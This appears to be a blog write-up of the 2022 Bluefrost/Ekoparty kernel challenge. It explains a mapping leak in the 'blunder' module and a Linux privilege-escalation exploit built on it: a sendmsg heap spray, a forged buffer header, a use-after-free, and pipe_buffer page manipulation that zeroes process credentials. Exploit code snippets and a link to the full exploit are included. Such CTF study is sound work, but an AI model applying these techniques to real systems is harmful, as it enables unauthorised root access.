---
layout: post
title: Bluefrost challenge - EKOPARTY_2022
date: 2023-09-30
categories: ["Exploit", "Linux", "Kernel"]
thumbnail: "assets/images/thumb_3.png"
---

## Introduction

I am leveraging the upcoming Ekoparty to share how I wrote an exploit for the Bluefrost challenge last edition (2022), which achieved local privilege escalation on Linux.
The challenge was a kernel module, which was a simulation of an Android module but simpler than it. In fact, the only real vulnerability is the memory information leak.
We are going to realize this challenge in kernel 6.2.0.

## The blunder module

We have one scenario in which we can send and receive messages to/from the kernel. If you are curious [here](https://static.bluefrostsecurity.de/files/lab/module.tar.gz) is the code to download. Basically we open the module, associating it to one fd, after we map the fd, the mapped area will contain blunder_buffer and the pointer of this area is from blunder_alloc->mapping. After that, we can send and receive messages with an ioctl command. See these structs to familiarize with the module.

```C
struct blunder_device {
	spinlock_t lock;
	struct rb_root procs;
	struct blunder_proc *context_manager;
};
```
```C
struct blunder_message {
	struct list_head entry;
	int opcode;
	struct blunder_proc *from;
	struct blunder_buffer *buffer;
	size_t num_files;
	struct file **files;
};
```
```C
struct blunder_proc {
	struct kref refcount;
	spinlock_t lock;
	int pid;
	int dead;
	struct rb_node rb_node;
	struct blunder_alloc {
		spinlock_t lock;
		void *mapping;
		size_t mapping_size;
		ptrdiff_t user_buffer_offset;
		struct list_head buffers;
	} alloc;
	struct list_head messages;
}
```

```C
struct blunder_buffer {
	struct list_head buffers_node;
	atomic_t free;
	size_t buffer_size;
	size_t data_size;
	size_t offsets_size;
	unsigned char data[0];
} 
```
```C
struct blunder_user_message {
	int handle;
	int opcode;
	void *data;
	size_t data_size;
	size_t *offsets;
	size_t offsets_size;
	int *fds;
	size_t num_fds;
};
```

Opening the module, we map the file in user space (note that only the PROT_READ flag is active in the mmap function) to get the messages to/from the kernel, which will be physically shared in kernel space.

![blunder module.png](/assets/images/blunder module.png)

We are going to see what happens when we send a message of 256 'B' and a mapped page with mmap.

```C
217 static int blunder_send_msg(struct blunder_proc *proc, struct blunder_user_message * __user arg) {
218    int ret = 0;
219    int curr_fd;
220    struct blunder_user_message umsg;
221    struct blunder_message *msg = NULL;
222    struct blunder_handle *target_handle = NULL;
223    struct blunder_proc *target = NULL;
224    struct blunder_buffer *buf = NULL;

       ...

230    /* Read data in */
231    if (copy_from_user(&umsg, arg, sizeof(umsg))) {
232        return -EFAULT;
233    }
234
235    /* Verify parameters first */
236    // FIXME We do not support offsets and objects yet!
237    if (umsg.data_size > BLUNDER_MAX_MAP_SIZE || umsg.offsets_size > 0 
238        || umsg.num_fds > BLUNDER_MAX_FDS) {
239        return -EINVAL;
240    }
241
242    /* Try to figure out destination */
243    if (umsg.handle == 0) {
244        spin_lock(&blunder_device.lock);
245        if (blunder_device.context_manager && !blunder_device.context_manager->dead) {
246            target = blunder_device.context_manager;
247            kref_get(&target->refcount);
248        }
249        spin_unlock(&blunder_device.lock);
250    } else {
251        // blunder_proc_for_pid gets us a ref to the process if it exists
252        target = blunder_proc_for_pid(umsg.handle);
253    }
254    
255    if (!target) {
256        return -ENOENT;
257    }     
258
259    /* Got a target. Allocate message of the right size for the fds */
260    msg = kzalloc(sizeof(*msg) + umsg.num_fds*sizeof(struct file *), GFP_KERNEL);
261    if (!msg) {
262        ret = -ENOMEM;
263        goto release_target;
264    }

       ...

269    /* Get buffer */ 
270    buf = blunder_alloc_get_buf(&target->alloc, umsg.data_size + umsg.offsets_size); // we look for buffers in the buffer list from proc->alloc
271    if(!buf) {
272        ret = -ENOMEM;
273        goto release_msg;
274    }
275
276    buf->data_size = umsg.data_size;
277    msg->buffer = buf;
278    msg->from = proc->pid;
279
280  
281    if (copy_from_user(buf->data, umsg.data, umsg.data_size)) { // Return data to user
282        ret = -EFAULT;
283        goto release_buf;
284    }
285
286    //OK We're good to go now. Link it into the target
287    spin_lock(&target->lock);
288    list_add_tail(&msg->entry, &target->messages);
289    spin_unlock(&target->lock);

    ...
}
```

Basically, the module checks if it has a buffer mapped for their procedure alloc in its own list. Observe in the function *blunder_alloc_get_buf* that if it finds one of enough size, it will get it. If the buffer that we are checking is smaller, the module will split it into two with its corresponding header and footer. After *blunder_alloc_get_buf* finishes and get the buffer, the data is written. Remember that it is also written in user space!

```C
23 struct blunder_buffer *blunder_alloc_get_buf(struct blunder_alloc *alloc, size_t size) {
24
25    struct blunder_buffer *buf = NULL;
26    struct blunder_buffer *new_buf = NULL;
27    list_for_each_entry(buf, &alloc->buffers, buffers_node) {
28        if (atomic_read(&buf->free) && buf->buffer_size >= size) {
29
30            pr_err("blunder: Free buffer at %lx, size %lx\n",buf, buf->buffer_size);
31
32            // Is there enough space to split? Then do it!
33            uint64_t remaining = buf->buffer_size - size;
34            
35            if (remaining > MIN_BUF_SIZE) { // Split buffer
36
37                // Make new buf at the end of this buf
38                new_buf = (struct blunder_buffer *)((void *)&buf->data[size]);
39                // New buffer size is remaining - header
40                new_buf->buffer_size = remaining - sizeof(*new_buf);
41                // Adjust old buffer size to size
42                buf->buffer_size = size;
43                // Mark as free
44                atomic_set(&new_buf->free, 1);
45
46                pr_err("blunder: splitting buffer. New buffer at %lx, size %lx\n",new_buf, new_buf->buffer_size);
47
48
49                // Add to list after our current entry
50                list_add(&new_buf->buffers_node, &buf->buffers_node);
51            }
52
53            // Mark buf as non-free and return it
54            atomic_set(&buf->free, 0);
55            return buf;
56        }
57    }
58
59    // If we got here we're out of mem!
60    return NULL;
61    
62 }
```

We see how is allocated at kernel space (and also written at user space, when we mapped).

![blunder buffer.png](/assets/images/blunder buffer.png)

## The vulnerability

At the *blunder_mmap*, we can see how the physical memory is assigned to the user-mapped area.

```C
/* Just map the whole thing */
pfn = virt_to_phys(proc->alloc.mapping) >> PAGE_SHIFT;
ret = remap_pfn_range(vma, vma->vm_start, pfn, sz, vma->vm_page_prot);
```

Starting from here, the kernel memory addresses that are written in blunder_buffer can be viewed in user-space (leak information). But we still have another ace up our sleeve, with mprotect we can make the user-space mapping writable!

## The explotation

As we have a leak, and we can alter the blunder_buffer list, the objective is:

* Map 3 modules (the mapping will be of size 0x20000, including freed, normal, and victim) so they will allocate their corresponding struct proc, where two of them (freed and normal) must be contiguous.
* Release one contiguous struct proc module first (freed). This will free the first struct proc of size 0x80.
* Execute a sendmsg spray (also it could be FUSE + setxattr) of size 0x80 (like the struct proc), overwriting the freed to position near the normal proc (normal at -0x30) a header of a fake blunder_buffer.
* Alter the header of a blunder_buffer (the normal one) in user space. When sending a message, it will take the header of the fake blunder_buffer (normal at -0x30) from the list of buffers, allowing us to overwrite the alloc->mapping (of the normal module) with the value of the victim's mapping.
* Send a message to alter the alloc->mapping of the normal with the value of the victim mapping.
* Release the normal module (leading to Use After Free in victim).
* Perform read/write operations with pipe_buffer to achieve elevated privileges.

![proc_1.png](/assets/images/proc_1.png)

![proc_2.png](/assets/images/proc_2.png)

![proc_3.png](/assets/images/proc_3.png)

## sendmsg spray

sendmsg is a syscall in which we can send and receive buffers from user to/from kernel land. It can be useful for performing a heap spray, we just have to block the buffer so it is not freed when sent. To achieve this we must: fill the receive buffer. When we do this, in the next stage is to send messages without setting the noblock flag (MSG_DONTWAIT), therefore they will be left waiting, blocked in the heap to be handled.

```C
131 // Fill the queue
132 while (sendmsg(thread->pair[0], &mhdr, MSG_DONTWAIT) > 0);

...

151 /* This will block */
152 if (sendmsg(thread->pair[0], &mhdr, 0) < 0) {
153	perror("[-] sendmsg");
154	goto fail;
155 }
```

## Read/Write with pipe_buffer

This technique is well detailed in [this](https://www.interruptlabs.co.uk/articles/pipe-buffer) excellent write-up, which serves as a good reference. But, I am going to give another perspective, where we will achieve to exploit 100% of the cases. We are going to carry out the following steps:

* Deduce vmemmap_base.
* Find the position of a handleable pipe_buffer (the buffers were initialized with 0xcc bytes).
* Search at the page array for the page of the process credentials (reading with page manipulation).

```C
char buf[4096] = {0};
char buf_c[8] = { [0 ... 7] = 0xcc };

char *name = "exp1337";
prctl(PR_SET_NAME, name, 0, 0, 0);
/* Searching for credentials page */	
for (uint64_t i = 0; i < 0x10000; i++) {
	// map in /proc/iomem
	page = (mem_map + ((0x100000000 >> 12) * 0x40)) + (0x40 * i);
	fakepipe->page = page;
	fakepipe->offset = 0;
	fakepipe->len = 4096 + 1; // To avoid release
	fakepipe->flags = PIPE_BUF_FLAG_CAN_MERGE;
	
	if (!pos) {
		for (int j = 0; j < MAX_PIPES; j++) {
			n = read(pipefd[j][0], buf, 4096);
			
			if (n < 0 || strncmp(buf, buf_c, 8)) {
				printf("[+] pipe fd found at %dth\n", j);
				pos = j;
				break;
			}
			
			bzero(buf, 4096);
		}
	} else {
		bzero(buf, 4096);
		n = read(pipefd[pos][0], buf, 4096);
	}
	
	if (n != 4096) continue;
	
	char *off = memmem(buf, 4096, name, strlen(name));
```
* Deduce the page creds. In this way, we will always find the distance to the credentials page.

```C
if (off) { 
	uint64_t creds = 0, real_creds = 0;
	
	creds      = *(uint64_t *) (off - 16);
	real_creds = *(uint64_t *) (off - 24);
	
	if (creds && real_creds && creds == real_creds) {
		puts("[+] Creds found!!");
		
		char zeroes[0x20] = { [0 ... 0x1f] = 0 };
		uint64_t task = (*(uint64_t *) (off - 320)) - 0xb8;
		uint64_t cred_page = 0;
		/* In this way, we will find the distance to the credentials page */
		if (task > creds) {
			cred_page = page - ((task >> 12) - (creds >> 12)) * 0x40;
		} else {
			cred_page = page + ((creds >> 12) - (task >> 12)) * 0x40;
		}
```
* Write zeroes in the credentials.

```C
uint64_t cred_off = creds & 0xfff;
fakepipe->page = cred_page; 
fakepipe->offset = cred_off + 4;
fakepipe->len = 0;
fakepipe->flags = PIPE_BUF_FLAG_CAN_MERGE;
int n_w = write(pipefd[pos][1], zeroes, 0x20);
```

##### Demo

[![asciicast](https://asciinema.org/a/611236.svg)](https://asciinema.org/a/611236)

##### Full exploit

[https://gist.github.com/soez/9a741258857c1f2e7d0f0933030cd1ea](https://gist.github.com/soez/9a741258857c1f2e7d0f0933030cd1ea)

## References

[https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html)

[https://www.interruptlabs.co.uk/articles/pipe-buffer](https://www.interruptlabs.co.uk/articles/pipe-buffer)

